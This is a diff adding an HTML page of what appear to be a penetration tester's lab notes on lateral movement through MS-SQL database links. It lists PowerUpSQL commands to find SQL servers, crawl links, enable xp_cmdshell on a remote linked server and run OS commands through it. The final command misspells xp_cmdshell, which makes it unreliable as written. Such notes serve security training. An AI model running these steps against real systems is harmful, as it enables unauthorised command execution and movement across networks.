@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>MS-SQL Databases</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># MS-SQL Databases</h1></strong><br />SQL servers are good opportunities for lateral movement because domain users can be mapped to database roles.<br /><br /><strong><h2>## Database Links</h2></strong><br />A database link allows a SQL server to access external data sources:<br />- like other SQL servers<br />- like OLE DB data sources<br /><br />Database links work even across forest trusts.<br /><br />In SQL server ←-→ SQL server links,<br />it&#39;s possible to execute stored procedures.<br /><br /><strong><h2>## Exploit</h2></strong><br /><strong><h3>### PowerUpSQL</h3></strong><br /><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a><br /><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</a><br /><br /><div class="codebox"><div class="codebox">#&nbsp;SPN&nbsp;scanning<br />#&nbsp;&nbsp;&nbsp;-&nbsp;looks&nbsp;for&nbsp;all&nbsp;SPNs&nbsp;that&nbsp;begin&nbsp;with&nbsp;MSSQL<br />#&nbsp;&nbsp;&nbsp;-&nbsp;doesn&#39;t&nbsp;mean&nbsp;necessarily&nbsp;that&nbsp;there&#39;s&nbsp;a&nbsp;SQL&nbsp;server&nbsp;running,&nbsp;just&nbsp;that&nbsp;there&#39;s&nbsp;an&nbsp;SPN<br />Get-SQLInstanceDomain<br /><br />#&nbsp;Check&nbsp;accessibility&nbsp;to&nbsp;SQL&nbsp;servers<br />Get-SQLConnectionTestThreaded<br />Get-SQLInstanceDomain&nbsp;|&nbsp;Get-SQLConnectionTestThreaded&nbsp;-Verbose<br /><br />#&nbsp;Gather&nbsp;info<br />Get-SQLInstanceDomain&nbsp;|&nbsp;Get-SQLServerInfo&nbsp;-Verbose<br /><br />#&nbsp;Search&nbsp;for&nbsp;database&nbsp;links<br />Get-SQLServerLink&nbsp;-Instance&nbsp;dcorp-mssql&nbsp;-Verbose<br />Get-SQLServerLinkCrawl&nbsp;-Instance&nbsp;dcorp-mssql&nbsp;-Verbose<br /><br />#&nbsp;Enable&nbsp;xp_cmdshell&nbsp;on&nbsp;remote&nbsp;SQL&nbsp;database<br />EXECUTE(&#39;sp_configure&nbsp;&quot;xp_cmdshell&quot;,1;reconfigure;&#39;)&nbsp;AT&nbsp;&quot;eu-sql&quot;<br /><br />#&nbsp;Execute&nbsp;commands<br />Get-SQLServerLinkCrawl&nbsp;-Instance&nbsp;dcorp-mssql&nbsp;-Query&nbsp;&quot;exec&nbsp;master..xp_cmdhsell&nbsp;&#39;whoami&#39;&quot;&nbsp;|&nbsp;ft<br /></div></div><br /></div>
+</body>
+</html>
